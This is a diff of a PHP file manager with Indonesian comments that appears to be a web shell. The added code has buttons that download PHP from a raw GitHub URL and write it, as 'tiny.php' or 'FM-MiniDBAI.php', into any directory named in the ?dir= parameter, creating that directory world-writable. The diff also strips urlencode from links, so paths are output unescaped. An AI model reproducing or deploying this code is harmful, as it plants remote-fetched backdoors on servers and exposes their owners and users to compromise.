@@ -451,7 +451,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) 
         echo "Gagal memasang adminer.php.";
     }
 }
-?>
+?>  
 
 <form action="" method="post">
     <input type="submit" name="download_adminer" value="Adminer">
@@ -463,6 +463,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) 
 
 <?php
 if (isset($_POST['create_tiny'])) {
+    // Ambil direktori dari query parameter ?dir=
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; // Default ke root jika tidak ada query parameter dir
+
+    // Pastikan direktori berakhir dengan slash
+    if (substr($dir, -1) !== '/') {
+        $dir .= '/';
+    }
+
     // URL file yang ingin diambil
     $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';
 
@@ -477,14 +485,28 @@ if (isset($_POST['create_tiny'])) {
     curl_close($ch);
 
     if ($content !== false) {
+        // Tentukan lokasi file berdasarkan direktori
+        $filePath = $dir . 'tiny.php';
+        
+        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
+        if (!file_exists($dir)) {
+            mkdir($dir, 0777, true); // Membuat direktori dengan izin penuh jika belum ada
+        }
+        
         // Simpan konten ke dalam file tiny.php
-        file_put_contents('tiny.php', $content);
-        echo "File tiny.php berhasil dibuat!";
+        file_put_contents($filePath, $content);
+        echo "File tiny.php berhasil dibuat di $filePath!<br>";
+
+
+        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
+    
     } else {
         echo "Gagal mengambil konten dari URL. Error: $error";
     }
 }
 ?>
+
+
 
 
     <form method="post">
@@ -497,20 +519,21 @@ if (isset($_POST['create_tiny'])) {
 </td>
 
 
+
 <td>
 
 <?php
-if (isset($_POST['create_tiny'])) {
+if (isset($_POST['create_FM-MiniDBAI'])) {
+    // Ambil direktori dari query parameter ?dir=
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; // Default ke root jika tidak ada query parameter dir
+
+    // Pastikan direktori berakhir dengan slash
+    if (substr($dir, -1) !== '/') {
+        $dir .= '/';
+    }
+
     // URL file yang ingin diambil
     $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';
-
-    // Direktori yang ditentukan untuk menyimpan file
-    $dir = rtrim($_POST['directory'], '/') . '/.well-known/pki-validation/';
-
-    // Periksa apakah direktori ada, jika tidak, buat direktori tersebut
-    if (!is_dir($dir)) {
-        mkdir($dir, 0777, true); // Buat direktori beserta subdirektori
-    }
 
     // Inisialisasi cURL
     $ch = curl_init($url);
@@ -523,23 +546,40 @@ if (isset($_POST['create_tiny'])) {
     curl_close($ch);
 
     if ($content !== false) {
-        // Simpan konten ke dalam file tiny.php di direktori yang ditentukan
-        file_put_contents($dir . 'tiny.php', $content);
-        echo "File tiny.php berhasil dibuat di $dir!";
+        // Tentukan lokasi file berdasarkan direktori
+        $filePath = $dir . 'FM-MiniDBAI.php';
+        
+        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
+        if (!file_exists($dir)) {
+            mkdir($dir, 0777, true); // Membuat direktori dengan izin penuh jika belum ada
+        }
+        
+        // Simpan konten ke dalam file tiny.php
+        file_put_contents($filePath, $content);
+        echo "File FM-MiniDBAI.php berhasil dibuat di $filePath!<br>";
+
+
+        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
+    
     } else {
         echo "Gagal mengambil konten dari URL. Error: $error";
     }
 }
 ?>
 
-<form method="post">
-    <label for="directory">Masukkan direktori:</label>
-    <input type="text" id="directory" name="directory" required>
-    <input type="submit" name="create_tiny" value="Tiny">
-</form>
+
+
+
+    <form method="post">
+	<input type="submit" name="create_FM-MiniDBAI" value="FM-MiniDBAI">
+        
+    </form>
+
 
 
 </td>
+
+
 
 
 <td>
@@ -627,7 +667,7 @@ if (isset($_POST['download_wp'])) {
             <tr>
 <td>
     <!-- Form untuk mengunggah file -->
-    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
+    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
         <label>Upload file:</label>
         <input type="file" name="file" required>
         <input type="submit" value="Submit">
@@ -635,7 +675,7 @@ if (isset($_POST['download_wp'])) {
 </td>
 <td>
     <!-- Form untuk membuat direktori baru -->
-    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
+    <form action="?dir=<?php echo ($dir); ?>" method="post">
         <label>Make Dir:</label>
         <input type="text" name="new_dir" required>
         <input type="submit" value="Submit">
@@ -648,7 +688,7 @@ if (isset($_POST['download_wp'])) {
 
     <!-- Form untuk membuat file kosong -->
    
-    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
+    <form action="?dir=<?php echo ($dir); ?>" method="post">
         <label>Make file (.txt):</label>
         <input type="text" name="file_name" required><br>
         <label>Extensions file (Optional):</label>
@@ -704,7 +744,7 @@ $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
 $direktori_sekarang = getcwd();
 echo "" . htmlspecialchars($direktori_sekarang);
 ?>
-<b><a href="?dir=<?php echo urlencode($direktori_sekarang); ?>/">🏠︎ [Home]</a></b>
+<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>🏠︎
 
 <br><br>
 
@@ -720,14 +760,14 @@ echo "" . htmlspecialchars($direktori_sekarang);
     </tr>
 
     <tr>
-        <td><a href="?dir=<?php echo urlencode(dirname($dir)) . '/'; ?>">⏪</a></td>
+        <td><a href="?dir=<?php echo (dirname($dir)) . '/'; ?>">⏪</a></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td>    
             <?php if (isset($_SESSION['file_to_copy'])): ?>
-                <form action="?dir=<?php echo urlencode($dir); ?>&paste" method="post">
+                <form action="?dir=<?php echo ($dir); ?>&paste" method="post">
                     <input type="submit" value="Paste file here">
                 </form>
             <?php endif; ?>
@@ -758,7 +798,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     ?>
         <tr>
             <td>
-                <a href="?dir=<?php echo urlencode($dir . $folder . '/'); ?>">📁 <?php echo htmlspecialchars($folder); ?>/</a>
+                <a href="?dir=<?php echo ($dir . $folder . '/'); ?>">📁 <?php echo htmlspecialchars($folder); ?>/</a>
             </td>
             <td></td>
             <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); ?></td>
@@ -771,8 +811,8 @@ echo "" . htmlspecialchars($direktori_sekarang);
                 </form>
             </td>
             <td>
-                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($folder); ?>" onclick="return confirm('Delete folder ?')">[Delete]</a>
-                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($folder); ?>">[ReName]</a>
+                <a href="?dir=<?php echo ($dir); ?>&delete=<?php echo ($folder); ?>" onclick="return confirm('Delete folder ?')">[Delete]</a>
+                <a href="?dir=<?php echo ($dir); ?>&rename=<?php echo ($folder); ?>">[ReName]</a>
             </td>
         </tr>
     <?php endforeach; ?>
@@ -798,11 +838,11 @@ echo "" . htmlspecialchars($direktori_sekarang);
                 </form>
             </td>
             <td>
-                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete file ?')">[Delete]</a>
-                <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">[Edit]</a>
-                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">[ReName]</a>
-                <a href="?dir=<?php echo urlencode($dir); ?>&copy=<?php echo urlencode($file); ?>">[Copy]</a>
-                <a href="?dir=<?php echo urlencode($dir); ?>&zip=<?php echo urlencode($file); ?>">[Zip]</a>
+                <a href="?dir=<?php echo ($dir); ?>&delete=<?php echo ($file); ?>" onclick="return confirm('Delete file ?')">[Delete]</a>
+                <a href="?dir=<?php echo ($dir); ?>&edit=<?php echo ($file); ?>">[Edit]</a>
+                <a href="?dir=<?php echo ($dir); ?>&rename=<?php echo ($file); ?>">[ReName]</a>
+                <a href="?dir=<?php echo ($dir); ?>&copy=<?php echo ($file); ?>">[Copy]</a>
+                <a href="?dir=<?php echo ($dir); ?>&zip=<?php echo ($file); ?>">[Zip]</a>
             </td>
         </tr>
     <?php endforeach; ?>
@@ -820,7 +860,7 @@ if (class_exists('ZipArchive')) {
 
 
     <!-- Form untuk mengunggah dan mengekstrak file ZIP -->
-    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
+    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
         <label>Upload and extract ZIP file:</label>
         <input type="file" name="zip_file" required>
         <input type="submit" value="Extract ZIP">
